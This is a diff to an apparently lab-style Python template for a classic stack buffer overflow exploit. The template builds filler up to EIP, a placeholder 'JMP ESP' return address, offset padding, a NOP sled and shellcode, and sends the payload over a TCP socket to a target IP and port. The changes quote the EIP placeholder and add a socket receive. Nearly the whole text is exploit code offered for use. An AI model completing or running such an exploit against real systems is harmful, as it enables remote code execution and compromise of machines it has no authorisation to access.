@@ -9,7 +9,7 @@ target_port = [port]
 ## Enter in the msf-pattern_offset amount.
 filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
 ## Enter in the little endian hexcode value of the static memory address containing the 'JMP ESP' command.
-EIP = [little endian hexcode static memory address]
+EIP = "[little endian hexcode static memory address]"
 ## Enter the amount of byte space that seperates EIP and ESP.
 EIP_to_ESP = "C" * [byte space between EIP and ESP]
 nops = "\x90" * 20
@@ -24,6 +24,7 @@ try:
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target_IP, target_port))
   s.send(filler_to_EIP + EIP + EIP_to_ESP + nops + shellcode)
+  s.recv(1024)
   s.close()
     
   # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
